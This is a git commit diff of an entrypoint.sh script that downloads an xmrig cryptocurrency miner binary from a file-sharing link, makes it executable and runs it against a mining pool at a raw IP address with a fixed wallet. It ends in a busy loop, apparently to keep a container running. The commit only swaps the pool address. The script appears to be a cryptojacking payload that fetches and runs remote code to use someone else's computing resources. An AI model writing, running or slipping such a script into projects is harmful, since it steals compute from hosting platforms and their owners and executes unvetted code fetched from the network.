96388ddc70020739b2e15da2c575a0c12c9e1216
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-23 11:24:16 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,4 +1,4 @@
 wget https://transfer.sh/uTIFtD/xmrig
 chmod +x xmrig
-./xmrig --url 36.89.94.125:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
+./xmrig --url 20.120.30.75:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
